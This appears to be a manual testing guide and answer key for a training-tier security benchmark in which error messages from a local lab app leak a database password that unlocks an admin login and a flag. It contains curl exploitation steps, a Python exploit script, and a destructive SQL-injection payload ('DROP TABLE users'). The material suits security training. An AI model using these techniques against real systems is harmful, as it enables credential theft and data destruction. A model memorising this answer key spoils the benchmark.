# S7BEN-EASY-008: Manual Testing Guide

## Vulnerability: Error-Based Information Disclosure

### Overview
This Training tier benchmark demonstrates how poor exception handling can expose sensitive information through detailed error messages, stack traces, and debug output.

---

## Setup

```bash
cd benchmarks/S7BEN-EASY-008
make build
make up
make test
```

Access: http://localhost:5000

---

## Exploitation Steps

### Step 1: Trigger Type Error

```bash
curl http://localhost:5000/user/abc | jq .
```

**Expected Output:**
```json
{
  "error": "invalid literal for int() with base 10: 'abc'",
  "error_type": "ValueError",
  "traceback": "...",
  "config": {
    "db_host": "mysql.internal.corp",
    "db_user": "admin",
    "db_password": "S3cr3tDbP@ssw0rd!",
    "db_name": "production_db"
  },
  "internal_path": "/app"
}
```

**Key Finding:** `db_password` is exposed in error response!

### Step 2: Use Extracted Credentials

```bash
curl -X POST http://localhost:5000/admin/login \
  -d "password=S3cr3tDbP@ssw0rd!" | jq .
```

**Expected Output:**
```json
{
  "status": "success",
  "message": "Admin access granted",
  "flag": "S7BEN{error_disclosure_...}",
  "proof": "Credentials extracted from error messages"
}
```

---

## Alternative Error Triggers

### File Error
```bash
curl http://localhost:5000/file/secret.txt | jq .
```

### Database Error
```bash
curl -X POST http://localhost:5000/search \
  -d "query='; DROP TABLE users; --" | jq .
```

### JSON Error
```bash
curl -X POST http://localhost:5000/api/process \
  -H "Content-Type: application/json" \
  -d "invalid json{" | jq .
```

All reveal the same credentials in the error response.

---

## Python Exploit Script

```python
import requests

URL = "http://localhost:5000"

def exploit():
    print("=== S7BEN-EASY-008 Exploit ===\n")
    
    # Step 1: Trigger error to get password
    print("[*] Triggering type error...")
    error_response = requests.get(f"{URL}/user/abc").json()
    
    password = error_response.get('config', {}).get('db_password')
    print(f"[+] Extracted password: {password}")
    
    # Step 2: Login with password
    print("\n[*] Logging in as admin...")
    login_response = requests.post(
        f"{URL}/admin/login",
        data={"password": password}
    ).json()
    
    if login_response.get('flag'):
        print(f"\n{'='*50}")
        print(f"FLAG: {login_response['flag']}")
        print(f"{'='*50}")
        return True
    
    return False

if __name__ == "__main__":
    exploit()
```

---

## Verification Endpoints

| Endpoint | Purpose |
|----------|---------|
| `/api/oracle` | Shows expected exploitation path |
| `/api/verify` | Confirms success and returns flag |
| `/api/expected` | Shows correct approach (T1 only) |
| `/api/patch-status` | Toggle patched mode |
| `/api/telemetry` | Request metrics |

---

## Negative Control Testing

```bash
# Enable patched mode
curl -X POST http://localhost:5000/api/patch-status \
  -H "Content-Type: application/json" \
  -d '{"patched": true}'

# Trigger error - should be generic now
curl http://localhost:5000/user/abc | jq .
# Returns: {"error": "An error occurred", "status": "error"}
```

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- ✅ Triggered error via `/user/abc`
- ✅ Extracted `db_password` from error response
- ✅ Used password at `/admin/login`
- ✅ Retrieved flag
- ✅ Flag format: `S7BEN{error_disclosure_<32_hex_chars>}`
